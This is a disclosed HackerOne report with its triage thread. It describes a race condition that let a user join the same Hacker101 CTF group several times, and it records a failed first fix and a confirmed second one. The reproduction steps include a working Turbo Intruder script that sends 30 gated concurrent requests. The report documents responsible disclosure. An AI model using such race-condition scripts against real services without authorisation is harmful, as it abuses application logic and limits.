title: Race condition in joining CTF group

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
**Summary:**

A race condition in `https://ctf.hacker101.com/group/join` allows a user to join the same CTF group multiple times. 

The user will show up in the group member list multiple times, and affect the group statistics.

**Description:**

Interestingly a race condition in this feature was reported in #604534, but it seems like the implementation has changed slightly, allowing the same issue to occur.

### Steps To Reproduce

1. As the team leader, generate a shared invitation link. For this example the link was `https://ctf.hacker101.com/group/join?invite=fdb4ba75da6e8da41650369d24e3866f90384550f952474df194db8077bda8b0`.

2. Use Burp Suite to intercept this request and configure Turbo Intruder as follows:

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=100,
                           pipeline=True
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```

{F1692527}

3. Start the attack, and observe multiple requests succeeding with status code 200.

{F1692528}

We can verify from the invited user's screen that we have joined the same group multiple times.

{F1692529}

The user will also show up in the group multiple times from the group leader's screen.

{F1692530}

## Impact

Race condition allows a user to join the same group multiple times. This is more of a low-impact bug, but one that should be fixed nonetheless.

activities.message: Hey, uh... I accidentally submitted the wrong Asset domain, it should be https://ctf.hacker101.com. Sorry!

Hi @zeyu2001,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@princeofpersia
Thanks @princeofpersia. Any updates on this so far?

Hey @zeyu2001, I hope you are well!

Thank you for bringing this to our attention. I reached out to the responsible Engineering team to reproduce the issue and verify the impact. Please give them time to review your submission.

Thank you for your patience and happy hacking!

Hey @zeyu2001, thank you for your patience!

The team came back to me. Although we were able to reproduce the behaviour described, the impact is very low indeed. There is nothing that happens as an effect of exploiting this as flags are scored only once per user per flag, not on a group level.

Nevertheless we've uncovered a bug that should have already been fixed thanks to your report!

All the best and happy hacking
Thanks again for bringing to our attention, it's much appreciated!
We are looking into fixing this within the next 3 weeks. If you don't mind, we will request a retest from you once the fix is released.
Great, thanks!

Hey @zeyu2001, we have patched the issue.

We invite you to prove us wrong :)

Hi @zeyu2001 - thanks for your reply. Just to make sure I'm fully understanding what you're saying: you're saying that even though you're seeing a 500 internal server error, the user is still added to the group? Thanks!

In the above case I was able to join the group 4 times due to rows 0 to 3 being processed in parallel. The subsequent requests do not cause additional joining of groups because the joins would have been updated by then.
That is a shame. We will give it another go
Fix did not work
Revert report state to triaged from retesting
Good day, it took us a while but we have managed to revisit the implementation. Could you check now if the issue is solved?

I ran the same exploit again, and this time the user only joined the group once. The extra requests are redirected back to `/groups` and does not result in additional joining. It appears the issue is fixed, thanks!

{F2067985}
Thanks a lot and Happy Hacking!
